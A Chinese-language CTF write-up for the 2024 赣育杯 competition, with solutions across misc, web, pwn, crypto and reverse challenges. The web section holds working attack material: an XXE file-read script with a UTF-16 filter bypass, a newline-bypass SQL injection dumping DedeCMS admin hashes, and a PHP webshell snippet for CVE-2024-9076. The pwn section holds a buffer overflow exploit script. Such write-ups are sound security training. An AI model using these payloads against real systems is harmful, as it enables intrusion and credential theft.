---
title: '2024 赣育杯 Writeup'
description: 'header 缺失字节，以及两个 stream length 计算错误，补齐头部 0d0a'
pubDate: 2024-09-15
author: 'IHK-1'
tags: ['CTF', '赣育杯', '2024']
---

# MISC
## Areurobot?（docker）
手速

## AutoCAD

参考文章分析

header 缺失字节，以及两个 stream length 计算错误，补齐头部 0d0a

计算stream length1 ：16 * 2 + 7 +1 = 42

计算stream length2 : 11 * 16 = 176 具体在 176 左右，由于给了一位 9 ，补齐179 即可

完整如下：

使用 fas2lsp ，得到 flag

# WEB
## web1
xxe注入，waf用UTF-16绕过即可：

```python
import requests

url = 'http://bmljkqlnz8vri0c4.ctfw.edu.sangfor.com.cn/exploit.php'
data = """<!DOCTYPE lit[
    <!ELEMENT test ANY>
    <!ENTITY test SYSTEM "file:///flag">
    ]>
<result><code>&test;</code><msg>wu</msg></result>"""

re = requests.post(url ,data=data.encode('utf-16'))
print(re.text)
```

## web2
任意文件读取，下载pdf用010editor打开即可。

```plain
demo1/pubfunc/previewpdf?filepath=/flag
```

## web3
前台sql注入：在`plus/check.php`中的id参数存在注入，waf用换行绕过即可。

```plain
union%0Aselect 1,group_concat(pwd)%0Afrom%0Adede_admin -- 
```

![](https://raw.githubusercontent.com/guangjiovo/picgo/main/202410271619099.png)

cmd5付费拿到密码`tianwei123A`。

后台getshell：**CVE-2024-9076**（`article_string_mix.php`）。

```plain
$cmd = '_POST';
${$cmd}[1](${$cmd}[0]);
```

执行命令（`/data/downmix.data.php`）：

![](https://raw.githubusercontent.com/guangjiovo/picgo/main/202410271617078.png)

# PWN
## OF
溢出覆盖

```plain
from pwn import *
from ctypes import *
from struct import pack
banary = "./of"
elf = ELF(banary)
# libc = ELF("./libc.so.6")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
ip = 'ctfx.edu.sangfor.com.cn'
port = 41440
local = 0
if local:
    io = process(banary)
else:
    io = remote(ip, port)

context(log_level = 'debug', os = 'linux', arch = 'amd64')
#context(log_level = 'debug', os = 'linux', arch = 'i386')

def dbg():
    gdb.attach(io)
    pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'\x00'))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()

sl(b'A'*0x52+p32(0xc8e51295))  

ia()
```

# CRYPTO
## Random-dlp
randomlist相当于给出20组992bit的数据。加上128bit的g足以恢复随机数

但是randomlist[0]和randomlist[1]不是直接给出random相关的值

要利用randomlist[0]和randomlist[1]分解数据。

然后用extend_mt19937的板子回溯即可

exp：

```plain
from extend_mt19937_predictor import ExtendMT19937Predictor 
import sys 
sys.setrecursionlimit(3000)

f = open("output.txt",'r').readlines()
p = eval(f[0])
g = eval(f[1])
c = eval(f[2])

random_list = eval(f[3])

# 分解
N = random_list[0]
gift = random_list[1]

def fac(p,q): 
    if len(p) == 1024:
        pp = int(p,2)
        if N % pp == 0:
            print(f"num1 = {pp}")
            print(f"num2 = {N // pp}")
    else:
        l = len(p)
        pp = int(p,2)
        qq = int(q,2)
        if (pp ^ qq) % (2 ** l) == gift % (2**l) and pp * qq % (2**l) == N % (2**l):
            fac('1' + p,'1' + q) 
            fac('0' + p,'1' + q) 
            fac('1' + p,'0' + q) 
            fac('0' + p,'0' + q) 

# fac('1','1')

num1 = 127954378905954473979599580543506133734470934402921187567126328044915399136783613004594347893231249786782113863929878799565038392492182148282608301947643527866047185811106214065159313666530775740342170598378474744062316856449855121227117986037506212272472581097517909639356259473022026193056598279705883312493
num2 = 39590745269613494512251071983478757508814280272882049594849029032543594900913069786771939178626302619505593605829896534613681707527396968070583148545044036306348014204000427687094161885558852315374684881011665955520787218713536145424007912730740353898075406161865607017294126568950247058934097741037059441349

tmp = [num1,num2] + random_list[2:]
D = [] 
for i in range(len(tmp)):
    D.append(tmp[i] >> 32)

predictor = ExtendMT19937Predictor() 

predictor.setrandbits(g,128)
for i in range(len(D)):
    predictor.setrandbits(D[i],992)

for i in range(len(D)):
    predictor.backtrack_getrandbits(992)

predictor.backtrack_getrandbits(128)
predictor.backtrack_getrandbits(32)

m = predictor.backtrack_getrandbits(128)
flag = b'Sangfor{'+str(m).encode()+b'}'
print(flag)
```

# REVERSE
## 勒索病毒
secret.enc文件里面直接有flag

## level3
使用dumpdex 工具 成功脱壳

看到里面的是迷宫 然后使用 dfs 跑maze

```plain
#include <stdio.h>
#include <stdbool.h>

#define N 11
#define M 11

char maze[12][12] = {
    "###########",
    "#****#****#",
    "#*#*###*#*#",
    "#*#*****#*#",
    "#*#######*#",
    "#*#*******#",
    "#*#*#*#*#*#",
    "#*#*#*#*#*#",
    "###*#*#*###",
    "#***#*#**$#",
    "###########"
};

bool visited[N][M];
char path[100]; // 用于记录路径
int pathIndex = 0;

// Directions for movement: W (up), A (left), S (down), D (right)
int dir[4][2] = { {-1, 0}, {0, -1}, {1, 0}, {0, 1} };
char dirChar[4] = { 'w', 'a', 's', 'd' };

// Function to check if a cell is valid
bool isValid(int x, int y) {
    return (x >= 0 && x < N && y >= 0 && y < M && maze[x][y] != '#' && !visited[x][y]);
}

// DFS function
bool dfs(int x, int y) {
    // Mark the cell as visited
    visited[x][y] = true;
    path[pathIndex++] = '\0'; // Current path end
    
    // Check if we reached the goal
    if (maze[x][y] == '$') {
        return true;
    }
    
    // Explore all four directions
    for (int i = 0; i < 4; i++) {
        int newX = x + dir[i][0];
        int newY = y + dir[i][1];
        
        if (isValid(newX, newY)) {
            path[pathIndex - 1] = dirChar[i]; // Record the move
            if (dfs(newX, newY)) {
                return true; // If we found a path to the goal
            }
        }
    }
    
    // Backtrack
    visited[x][y] = false;
    pathIndex--; // Remove the last move from the path
    return false;
}

int main() {
    // Start DFS from (1, 1)
    if (dfs(1, 1)) {
        printf("Path to the goal found: ");
        for (int i = 0; i < pathIndex; i++) {
            printf("%c", path[i]);
        }
        printf("\n");
    } else {
        printf("No path to the goal.\n");
    }
    return 0;
}
```

跑出路径之后用md5加密一下

![]()

套下flag格式就行了

## Nano
通过输出判断 可以把所有条件 都去输入进去来满足条件

exp:

```plain
from multiprocessing import Pool
import subprocess

# 定义生成 flag 的函数
def create_flag(i, j, k, l, m, n, v, x):
    return f'Sangfor{{{i}{j}-{k}-{l}-{m}-{n}{v}{x}}}'

# 定义处理每个 flag 的函数
def check_flag(flag):
    process = subprocess.Popen(['./nanobot'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    output, _ = process.communicate(input=(flag + '\n').encode())
    
    if b'Well done~' in output:
        print(f'Found flag: {flag}')
        process.kill()  # 找到 flag 后终止进程
    else:
        process.kill()  # 终止进程

# 列出所有可能的值
a1 = ['f9a0', 'fc75', '6875']
a2 = ["943d", "1ab3", "1a50", "1e40"]
a3 = ["d19b", "bd69", "b1d8", "b013", "dea6"]
a4 = ["d19b", "bd69", "b1d8", "b013", "dea6"]
a5 = ["943d", "1ab3", "1a50", "1e40"]
a6 = ["943d", "1ab3", "1a50", "1e40"]
a7 = ["c690", "366f", "c239", "c31e"]
a8 = ["c690", "366f", "c239", "c31e"]

# 创建所有可能的 flag
flags = [create_flag(i, j, k, l, m, n, v, x) for i in a1 for j in a2 for k in a3 for l in a4 for m in a5 for n in a6 for v in a7 for x in a8]

# 创建进程池，设置最大进程数为 8
with Pool(processes=8) as pool:
    pool.map(check_flag, flags)  # 使用池中的进程并行处理 flag

```

